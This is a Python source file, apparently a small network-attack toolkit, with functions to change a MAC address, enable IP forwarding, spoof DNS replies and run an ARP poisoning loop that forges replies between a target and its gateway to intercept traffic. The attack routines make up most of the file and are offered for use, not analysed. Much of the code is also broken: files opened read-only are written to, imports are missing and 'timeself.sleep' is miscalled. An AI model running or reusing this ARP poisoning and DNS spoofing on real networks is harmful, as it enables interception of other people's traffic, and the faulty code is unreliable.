import subprocess
import re

def change_mac(interface, mac):
	subprocess.call(["ifconfig", interface, "down"])
	subprocess.call(["ifconfig", interface, "hw", "ether", mac])
	subprocess.call(["ifconfig", interface, "up"])

def get_ipv4_by_interface(interface):
	ifconfig_result = subprocess.check_output(["ifconfig", interface])
	print(ifconfig_result)
	regex_result = re.search(r'inet addr:(\d{1,3}\.?){4}', ifconfig_result)
	print(regex_result)
	if regex_result:
		sub_regex_result = re.search(r'(\d{1,3}\.?){4}', regex_result.group(0))
		return sub_regex_result.group(0)
	else:
		return None

def get_mac_by_interface(interface):
	try:
		ifconfig_result = subprocess.check_output(["ifconfig", interface])
	except subprocess.CalledProcessError as e:
		print("[-] No Device")
		return None

	regex_result = re.search(r'(\w{2}:){5}\w{2}', ifconfig_result)
	if regex_result:
		return regex_result.group(0)
	else:
		return None

def enableForwardPackets():
	file_ip_forward = open('/proc/sys/net/ipv4/ip_forward', 'r')
	file_ip_forward.write('1')
	file_ip_forward.close()

def disableForwardPackets():
	file_ip_forward = open('/proc/sys/net/ipv4/ip_forward', 'r')
	file_ip_forward.write('0')
	file_ip_forward.close()

def dnsSpoofing():
	#in progress
	#read config file, build a dictionary
	
	def processPacket(packet):
		if(packet.haslayer('DNS')):
			if(packet[DNS].qd.haslayer('DNSQR')):

				target_url = packet[DNS].qd.qname

				if(target_url in dictionary):
					packet[DNS].qd.qname = dictionary[target_url]


		send(packet)

	sniff(i='eth0', callback = 'processPacket')

def getMac(ipAdress, timeout=2):
	answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ipAdress), timeout = timeout, retry = 2, verbose = False)

	if len(answered) >= 1:

		request, response = answered[0]

		return response[Ether].src
	else:
		return None

def craftArpPacket(opCode, dstIP, srcIp, dstMac, srcMac = None):
	arpPacket = ARP()
	arpPacket.op = opCode
	arpPacket.psrc = srcIp
	arpPacket.pdst = dstIP
	arpPacket.hwdst = dstMac

	if srcMac != None:
		arpPacket.hwsrc = srcMac
		
	return arpPacket

def poisonTarget(gateway_ip, gateway_mac, target_ip, target_mac):
	poisonPacketTarget = craftArpPacket(cons.ARP_RESPONSE_OP_CODE, target_ip, gateway_ip, target_mac)
	poisonPacketRouter = craftArpPacket(cons.ARP_RESPONSE_OP_CODE, gateway_ip, target_ip, gateway_mac)
	
	print('Starting ARP Poison')
	count = 0

	while(1):
		count += 1
		try:
			send(poisonPacketTarget, verbose = False)
			send(poisonPacketRouter, verbose = False)
			print("\rSending Packets " + str(count%4 * '.'), end="", flush=True)
			sys.stdout.write("\033[K")
			timeself.sleep(1)

		except KeyboardInterrupt:
			restoreTarget(gateway_ip, gateway_mac, target_ip, target_mac)
			print('\nStoping ARP Poison')
			return

def restoreTarget(gateway_ip, gateway_mac, target_ip, target_mac):
	restorePacketTarget = craftArpPacket(cons.ARP_RESPONSE_OP_CODE, target_ip, gateway_ip, target_mac, gateway_mac)
	restorePacketRouter = craftArpPacket(cons.ARP_RESPONSE_OP_CODE, gateway_ip, target_ip, gateway_mac, target_mac)

	send(restorePacketTarget, verbose = False)
	send(restorePacketRouter, verbose = False)

	return